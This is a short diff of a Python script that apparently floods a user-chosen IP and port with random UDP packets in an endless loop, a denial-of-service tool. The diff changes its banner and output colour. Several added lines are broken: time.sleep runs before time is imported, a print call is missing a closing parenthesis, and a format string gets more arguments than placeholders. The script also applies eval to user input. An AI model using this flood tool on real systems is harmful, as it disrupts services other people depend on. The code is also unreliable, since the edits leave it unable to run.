@@ -14,7 +14,7 @@ print (''' \033[92m
  |____/|____/ \___/|___/ /_/\_\___|\___|©''')
 
 print()
-
+time.sleep(2)
 import sys
 import os
 import time
@@ -35,11 +35,9 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1337)
 #############
 #Install Figlet
-os.system("clear")
 os.system("apt-get install -y figlet")
-os.system("figlet Black Hat Ethical Hacking")
-print()
-print(colored("Author : SaintDruG", 'green'))
+os.system("clear")
+os.system("figlet Hacking")
 print()
 ip = input(" IP Target: => ")
 port = eval(input(" Port  : => "))
@@ -66,6 +64,6 @@ while True:
             pass
         sock.sendto(bytes, (ip, port))
         sent += 1
-        print(colored("[!] sent %s Target: %s" % (sent, ip, port), 'green'))
+        print(colored("[!] sent %s Target: %s" % (sent, ip, port), 'yellow')
     except KeyboardInterrupt:
         sys.exit()
